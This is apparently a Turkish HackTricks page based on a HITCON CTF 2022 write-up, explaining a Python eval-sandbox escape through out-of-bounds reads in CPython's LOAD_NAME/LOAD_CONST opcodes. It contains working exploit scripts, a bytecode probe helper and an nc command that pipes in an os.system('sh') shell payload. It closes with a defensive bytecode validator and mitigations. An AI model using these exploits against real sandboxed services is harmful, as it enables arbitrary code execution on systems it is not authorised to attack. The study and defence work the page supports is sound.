# LOAD_NAME / LOAD_CONST opcode OOB Okuma

{{#include ../../../banners/hacktricks-training.md}}

**Bu bilgi** [**bu yazıdan alındı**](https://blog.splitline.tw/hitcon-ctf-2022/)**.**

### TL;DR <a href="#tldr-2" id="tldr-2"></a>

LOAD_NAME / LOAD_CONST opcode'daki OOB okuma özelliğini, bellekteki bazı sembolleri almak için kullanabiliriz. Bu, istediğiniz bir sembolü (örneğin, fonksiyon adı) almak için `(a, b, c, ... yüzlerce sembol ..., __getattribute__) if [] else [].__getattribute__(...)` gibi bir hile kullanmak anlamına gelir.

Sonra sadece istismarınızı oluşturun.

### Genel Bakış <a href="#overview-1" id="overview-1"></a>

Kaynak kodu oldukça kısa, sadece 4 satır içeriyor!
```python
source = input('>>> ')
if len(source) > 13337: exit(print(f"{'L':O<13337}NG"))
code = compile(source, '∅', 'eval').replace(co_consts=(), co_names=())
print(eval(code, {'__builtins__': {}}))1234
```
Arbitrary Python kodu girebilirsiniz ve bu, bir [Python kod nesnesi](https://docs.python.org/3/c-api/code.html) olarak derlenecektir. Ancak, bu kod nesnesinin `co_consts` ve `co_names` boş bir demet ile eval edilmeden önce değiştirilecektir.

Bu şekilde, tüm ifadeler sabitler (örneğin, sayılar, dizeler vb.) veya isimler (örneğin, değişkenler, fonksiyonlar) içeriyorsa, sonunda segmentasyon hatasına neden olabilir.

### Sınır Dışı Okuma <a href="#out-of-bound-read" id="out-of-bound-read"></a>

Segfault nasıl meydana gelir?

Basit bir örnekle başlayalım, `[a, b, c]` aşağıdaki bytecode'a derlenebilir.
```
1           0 LOAD_NAME                0 (a)
2 LOAD_NAME                1 (b)
4 LOAD_NAME                2 (c)
6 BUILD_LIST               3
8 RETURN_VALUE12345
```
Ama `co_names` boş bir demet haline gelirse ne olur? `LOAD_NAME 2` opcode'u hala çalıştırılır ve o bellek adresinden değer okumaya çalışır. Evet, bu bir sınır dışı okuma "özelliği".

Çözümün temel konsepti basittir. CPython'daki bazı opcode'lar, örneğin `LOAD_NAME` ve `LOAD_CONST`, OOB okuma için savunmasızdır (?).

Bu opcode'lar, `consts` veya `names` demetinden `oparg` indeksinden bir nesne alır (bu, `co_consts` ve `co_names`'in arka planda adlandırıldığı şeydir). CPython'un `LOAD_CONST` opcode'unu işlerken ne yaptığını görmek için `LOAD_CONST` hakkında aşağıdaki kısa kesite bakabiliriz.
```c
case TARGET(LOAD_CONST): {
PREDICTED(LOAD_CONST);
PyObject *value = GETITEM(consts, oparg);
Py_INCREF(value);
PUSH(value);
FAST_DISPATCH();
}1234567
```
Bu şekilde OOB özelliğini kullanarak rastgele bellek ofsetinden bir "isim" alabiliriz. Hangi isme sahip olduğunu ve ofsetinin ne olduğunu öğrenmek için, `LOAD_NAME 0`, `LOAD_NAME 1` ... `LOAD_NAME 99` ... denemeye devam edin. Oparg > 700 civarında bir şey bulabilirsiniz. Elbette gdb kullanarak bellek düzenine de bakmayı deneyebilirsiniz, ama bunun daha kolay olacağını düşünmüyorum?

### Exploit Oluşturma <a href="#generating-the-exploit" id="generating-the-exploit"></a>

Bu yararlı ofsetleri isimler / sabitler için aldıktan sonra, o ofsetten bir isim / sabit nasıl alır ve kullanırız? İşte size bir hile:\
Ofset 5'ten (`LOAD_NAME 5`) bir `__getattribute__` ismi alabileceğimizi varsayalım (`co_names=()`), o zaman sadece şu adımları izleyin:
```python
[a,b,c,d,e,__getattribute__] if [] else [
[].__getattribute__
# you can get the __getattribute__ method of list object now!
]1234
```
> Dikkat edin ki, bunu `__getattribute__` olarak adlandırmak gerekli değildir, daha kısa veya daha garip bir isim verebilirsiniz.

Bunun arkasındaki nedeni sadece bytecode'unu görüntüleyerek anlayabilirsiniz:
```python
0 BUILD_LIST               0
2 POP_JUMP_IF_FALSE       20
>>    4 LOAD_NAME                0 (a)
>>    6 LOAD_NAME                1 (b)
>>    8 LOAD_NAME                2 (c)
>>   10 LOAD_NAME                3 (d)
>>   12 LOAD_NAME                4 (e)
>>   14 LOAD_NAME                5 (__getattribute__)
16 BUILD_LIST               6
18 RETURN_VALUE
20 BUILD_LIST               0
>>   22 LOAD_ATTR                5 (__getattribute__)
24 BUILD_LIST               1
26 RETURN_VALUE1234567891011121314
```
`LOAD_ATTR`'ın aynı zamanda `co_names`'den ismi aldığını unutmayın. Python, isim aynıysa aynı offset'ten isimleri yükler, bu nedenle ikinci `__getattribute__` hala offset=5'ten yüklenir. Bu özelliği kullanarak, isim bellek yakınındaysa rastgele bir ismi kullanabiliriz.

Sayılar üretmek oldukça basit olmalıdır:

- 0: not \[\[]]
- 1: not \[]
- 2: (not \[]) + (not \[])
- ...

### Exploit Script <a href="#exploit-script-1" id="exploit-script-1"></a>

Uzunluk sınırı nedeniyle consts kullanmadım.

İlk olarak, bu isimlerin offset'lerini bulmamız için bir script.
```python
from types import CodeType
from opcode import opmap
from sys import argv


class MockBuiltins(dict):
def __getitem__(self, k):
if type(k) == str:
return k


if __name__ == '__main__':
n = int(argv[1])

code = [
*([opmap['EXTENDED_ARG'], n // 256]
if n // 256 != 0 else []),
opmap['LOAD_NAME'], n % 256,
opmap['RETURN_VALUE'], 0
]

c = CodeType(
0, 0, 0, 0, 0, 0,
bytes(code),
(), (), (), '<sandbox>', '<eval>', 0, b'', ()
)

ret = eval(c, {'__builtins__': MockBuiltins()})
if ret:
print(f'{n}: {ret}')

# for i in $(seq 0 10000); do python find.py $i ; done1234567891011121314151617181920212223242526272829303132
```
Ve aşağıdaki gerçek Python istismarını oluşturmak içindir.
```python
import sys
import unicodedata


class Generator:
# get numner
def __call__(self, num):
if num == 0:
return '(not[[]])'
return '(' + ('(not[])+' * num)[:-1] + ')'

# get string
def __getattribute__(self, name):
try:
offset = None.__dir__().index(name)
return f'keys[{self(offset)}]'
except ValueError:
offset = None.__class__.__dir__(None.__class__).index(name)
return f'keys2[{self(offset)}]'


_ = Generator()

names = []
chr_code = 0
for x in range(4700):
while True:
chr_code += 1
char = unicodedata.normalize('NFKC', chr(chr_code))
if char.isidentifier() and char not in names:
names.append(char)
break

offsets = {
"__delitem__": 2800,
"__getattribute__": 2850,
'__dir__': 4693,
'__repr__': 2128,
}

variables = ('keys', 'keys2', 'None_', 'NoneType',
'm_repr', 'globals', 'builtins',)

for name, offset in offsets.items():
names[offset] = name

for i, var in enumerate(variables):
assert var not in offsets
names[792 + i] = var


source = f'''[
({",".join(names)}) if [] else [],
None_ := [[]].__delitem__({_(0)}),
keys := None_.__dir__(),
NoneType := None_.__getattribute__({_.__class__}),
keys2 := NoneType.__dir__(NoneType),
get := NoneType.__getattribute__,
m_repr := get(
get(get([],{_.__class__}),{_.__base__}),
{_.__subclasses__}
)()[-{_(2)}].__repr__,
globals := get(m_repr, m_repr.__dir__()[{_(6)}]),
builtins := globals[[*globals][{_(7)}]],
builtins[[*builtins][{_(19)}]](
builtins[[*builtins][{_(28)}]](), builtins
)
]'''.strip().replace('\n', '').replace(' ', '')

print(f"{len(source) = }", file=sys.stderr)
print(source)

# (python exp.py; echo '__import__("os").system("sh")'; cat -) | nc challenge.server port
12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273
```
Temelde şu şeyleri yapar, bu dizeleri `__dir__` yönteminden alırız:
```python
getattr = (None).__getattribute__('__class__').__getattribute__
builtins = getattr(
getattr(
getattr(
[].__getattribute__('__class__'),
'__base__'),
'__subclasses__'
)()[-2],
'__repr__').__getattribute__('__globals__')['builtins']
builtins['eval'](builtins['input']())
```
---

### Sürüm notları ve etkilenen opcode'lar (Python 3.11–3.13)

- CPython bytecode opcode'ları hala `co_consts` ve `co_names` demetlerine tam sayı operandları ile indekslenir. Eğer bir saldırgan bu demetleri boş (veya bytecode tarafından kullanılan maksimum indeksin altında) hale getirebilirse, yorumlayıcı o indeks için sınır dışı belleği okuyacak ve yakın bellekten rastgele bir PyObject işaretçisi elde edecektir. İlgili opcode'lar en azından şunları içerir:
- `LOAD_CONST consti` → `co_consts[consti]` okur.
- `LOAD_NAME namei`, `STORE_NAME`, `DELETE_NAME`, `LOAD_GLOBAL`, `STORE_GLOBAL`, `IMPORT_NAME`, `IMPORT_FROM`, `LOAD_ATTR`, `STORE_ATTR` → `co_names[...]`'den isimleri okur (3.11+ için `LOAD_ATTR`/`LOAD_GLOBAL` düşük bitte saklama bayrağı bitleri taşır; gerçek indeks `namei >> 1`'dir). Her sürüm için kesin anlamlar için ayrıştırıcı belgelerine bakın. [Python dis docs].
- Python 3.11+ gizli `CACHE` girişleri ekleyen adaptif/inline önbellekler tanıttı. Bu, OOB ilkesini değiştirmez; sadece bytecode'u el ile oluşturuyorsanız, `co_code` oluştururken bu önbellek girişlerini hesaba katmanız gerektiği anlamına gelir.

Pratik sonuç: Bu sayfadaki teknik, bir kod nesnesini kontrol edebildiğinizde (örneğin, `CodeType.replace(...)` aracılığıyla) ve `co_consts`/`co_names`'i küçültebildiğinizde CPython 3.11, 3.12 ve 3.13 üzerinde çalışmaya devam eder.

### Kullanışlı OOB indeksleri için hızlı tarayıcı (3.11+/3.12+ uyumlu)

Eğer yüksek seviyeli kaynak yerine bytecode'dan ilginç nesneleri doğrudan araştırmayı tercih ediyorsanız, minimal kod nesneleri oluşturabilir ve indeksleri zorlayabilirsiniz. Aşağıdaki yardımcı, gerektiğinde otomatik olarak inline önbellekler ekler.
```python
import dis, types

def assemble(ops):
# ops: list of (opname, arg) pairs
cache = bytes([dis.opmap.get("CACHE", 0), 0])
out = bytearray()
for op, arg in ops:
opc = dis.opmap[op]
out += bytes([opc, arg])
# Python >=3.11 inserts per-opcode inline cache entries
ncache = getattr(dis, "_inline_cache_entries", {}).get(opc, 0)
out += cache * ncache
return bytes(out)

# Reuse an existing function's code layout to simplify CodeType construction
base = (lambda: None).__code__

# Example: probe co_consts[i] with LOAD_CONST i and return it
# co_consts/co_names are intentionally empty so LOAD_* goes OOB

def probe_const(i):
code = assemble([
("RESUME", 0),          # 3.11+
("LOAD_CONST", i),
("RETURN_VALUE", 0),
])
c = base.replace(co_code=code, co_consts=(), co_names=())
try:
return eval(c)
except Exception:
return None

for idx in range(0, 300):
obj = probe_const(idx)
if obj is not None:
print(idx, type(obj), repr(obj)[:80])
```
Notlar
- İsimleri sorgulamak için `LOAD_CONST` yerine `LOAD_NAME`/`LOAD_GLOBAL`/`LOAD_ATTR` kullanın ve yığın kullanımınızı buna göre ayarlayın.
- Gerekirse 255'ten büyük indekslere ulaşmak için `EXTENDED_ARG` veya birden fazla `arg` baytı kullanın. Yukarıda olduğu gibi `dis` ile inşa ederken, yalnızca düşük baytı kontrol edersiniz; daha büyük indeksler için, ham baytları kendiniz oluşturun veya saldırıyı birden fazla yükleme ayırın.

### Minimal bytecode-sadece RCE deseni (co_consts OOB → builtins → eval/input)

Bir `co_consts` indeksinin builtins modülüne karşılık geldiğini belirledikten sonra, yığını manipüle ederek `eval(input())`'i herhangi bir `co_names` olmadan yeniden oluşturabilirsiniz:
```python
# Build co_code that:
# 1) LOAD_CONST <builtins_idx> → push builtins module
# 2) Use stack shuffles and BUILD_TUPLE/UNPACK_EX to peel strings like 'input'/'eval'
#    out of objects living nearby in memory (e.g., from method tables),
# 3) BINARY_SUBSCR to do builtins["input"] / builtins["eval"], CALL each, and RETURN_VALUE
# This pattern is the same idea as the high-level exploit above, but expressed in raw bytecode.
```
Bu yaklaşım, `co_code` üzerinde doğrudan kontrol sağlarken `co_consts=()` ve `co_names=()` zorlayan (örneğin, BCTF 2024 “awpcode”) zorluklarda faydalıdır. Kaynak düzeyindeki hilelerden kaçınır ve bytecode yığın işlemleri ile tuple oluşturucularını kullanarak yük boyutunu küçük tutar.

### Sandbox'lar için savunma kontrolleri ve hafifletmeler

Güvenilmeyen kodu derleyen/değerlendiren veya kod nesnelerini manipüle eden bir Python “sandbox” yazıyorsanız, bytecode tarafından kullanılan tuple indekslerini sınır kontrolü için CPython'a güvenmeyin. Bunun yerine, kod nesnelerini çalıştırmadan önce kendiniz doğrulayın.

Pratik doğrulayıcı (co_consts/co_names için OOB erişimini reddeder)
```python
import dis

def max_name_index(code):
max_idx = -1
for ins in dis.get_instructions(code):
if ins.opname in {"LOAD_NAME","STORE_NAME","DELETE_NAME","IMPORT_NAME",
"IMPORT_FROM","STORE_ATTR","LOAD_ATTR","LOAD_GLOBAL","DELETE_GLOBAL"}:
namei = ins.arg or 0
# 3.11+: LOAD_ATTR/LOAD_GLOBAL encode flags in the low bit
if ins.opname in {"LOAD_ATTR","LOAD_GLOBAL"}:
namei >>= 1
max_idx = max(max_idx, namei)
return max_idx

def max_const_index(code):
return max([ins.arg for ins in dis.get_instructions(code)
if ins.opname == "LOAD_CONST"] + [-1])

def validate_code_object(code: type((lambda:0).__code__)):
if max_const_index(code) >= len(code.co_consts):
raise ValueError("Bytecode refers to const index beyond co_consts length")
if max_name_index(code) >= len(code.co_names):
raise ValueError("Bytecode refers to name index beyond co_names length")

# Example use in a sandbox:
# src = input(); c = compile(src, '<sandbox>', 'exec')
# c = c.replace(co_consts=(), co_names=())       # if you really need this, validate first
# validate_code_object(c)
# eval(c, {'__builtins__': {}})
```
Ekstra azaltma fikirleri
- Güvensiz girdi üzerinde keyfi `CodeType.replace(...)` kullanımına izin vermeyin veya sonuçta oluşan kod nesnesi üzerinde katı yapısal kontroller ekleyin.
- Güvensiz kodu, CPython semantiklerine güvenmek yerine, OS düzeyinde sandboxing (seccomp, iş nesneleri, konteynerler) ile ayrı bir süreçte çalıştırmayı düşünün.

## Referanslar

- Splitline’ın HITCON CTF 2022 yazısı “V O I D” (bu tekniğin kökeni ve yüksek seviyeli istismar zinciri): https://blog.splitline.tw/hitcon-ctf-2022/
- Python ayrıştırıcı belgeleri (LOAD_CONST/LOAD_NAME/etc. için indeks semantiklerini ve 3.11+ `LOAD_ATTR`/`LOAD_GLOBAL` düşük bit bayraklarını): https://docs.python.org/3.13/library/dis.html
{{#include ../../../banners/hacktricks-training.md}}
